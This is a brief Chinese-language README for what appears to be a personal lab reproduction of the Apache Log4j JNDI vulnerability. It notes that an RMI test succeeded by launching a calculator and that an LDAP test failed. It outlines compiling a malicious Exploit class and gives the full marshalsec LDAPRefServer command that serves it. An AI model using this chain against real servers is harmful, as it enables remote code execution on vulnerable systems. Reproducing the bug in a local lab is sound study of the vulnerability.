# log4j-bug
apache log4j 日志漏洞

RMI测试通过，调用计算器成功

RMI测试流程：
1. 启动RMIServer
2. 远程调用RMITest类

LDAP测试失败，网络搜索，失败原因可能是因为jdk版本问题
1. 手动编写恶意脚本：Exploit.java
2. javac编译java文件生成Exploit.class文件
3. 使用marshalsec.jar包启动ldap服务：
  java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://127.0.0.1:7777/#Exploit" 8888
3. 远程调用LogTest类



